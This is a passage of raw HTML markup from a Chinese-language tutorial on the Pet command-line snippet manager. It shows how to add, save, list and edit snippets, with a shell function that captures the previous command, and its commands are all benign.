class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127beb624074111-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127beb624074111-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127beb624074111-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-r\">new</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127beb624074111-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>添加命令和描述，然后按下回车键保存它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bee300542552\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCommand&gt; echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\r\nDescription&gt; Remove numbers from output.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bee300542552-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bee300542552-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bee300542552-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bee300542552-1\"><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Hell1o, Welcome1 2to OSTechNix4'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'1-9'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bee300542552-2\"><span class=\"crayon-v\">Description</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">numbers </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bee300542552-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1fa3f36d4576527b79f7052bfeac8ac1.png\" alt=\"\"></p>\n<p>这是一个简单的命令，用于从 <code>echo</code> 命令输出中删除所有数字。你可以很轻松地记住它。但是，如果你很少使用它，几天后你可能会完全忘记它。当然，我们可以使用 <code>CTRL+R</code> 搜索历史记录，但 Pet 会更容易。另外，Pet 可以帮助你添加任意数量的条目。</p>\n<p>另一个很酷的功能是我们可以轻松添加以前的命令。为此，在你的 <code>.bashrc</code> 或 <code>.zshrc</code> 文件中添加以下行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bf2494223795\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction prev() {\r\n PREV=$(fc -lrn | head -n 1)\r\n sh -c \"pet new `printf %q \"$PREV\"`\"\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bf2494223795-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bf2494223795-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bf2494223795-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bf2494223795-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bf2494223795-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bf2494223795-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">prev</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bf2494223795-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PREV</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">lrn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bf2494223795-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"pet new `printf %q \"</span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">PREV</span><span class=\"crayon-s\">\"`\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bf2494223795-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bf2494223795-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>执行以下命令来使保存的更改生效。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bf5152430135\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsource .bashrc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bf5152430135-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bf5152430135-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bf5152430135-1\"><span class=\"crayon-i\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">bashrc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bf5152430135-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bf8469983259\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsource .zshrc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bf8469983259-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bf8469983259-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bf8469983259-1\"><span class=\"crayon-i\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">zshrc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bf8469983259-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在，运行任何命令，例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bfb484683551\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat Documents/ostechnix.txt | tr '|' '\\n' | sort | tr '\\n' '|' | sed \"s/.$/\\\\n/g\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bfb484683551-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bfb484683551-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bfb484683551-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">Documents</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tr</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'|'</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sort</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tr</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'|'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"s/.$/\\\\n/g\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bfb484683551-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>要添加上述命令，你不必使用 <code>pet new</code> 命令。只需要：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bfe578049906\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ prev\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bfe578049906-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bfe578049906-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bfe578049906-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">prev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bfe578049906-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>将说明添加到该命令代码片段中，然后按下回车键保存。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/7158fec67536c6b012992d5502083043.png\" alt=\"\"></p>\n<h4 id=\"toc_5\">片段列表</h4>\n<p>要查看保存的片段，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c01128250270\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet list\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c01128250270-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c01128250270-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c01128250270-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">list</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c01128250270-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/22016dbcb67a4acd00cf651f0e35b9ec.png\" alt=\"\"></p>\n<h4 id=\"toc_6\">编辑片段</h4>\n<p>如果你想编辑代码片段的描述或命令，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c04168375587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet edit\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c04168375587-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c04168375587-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; 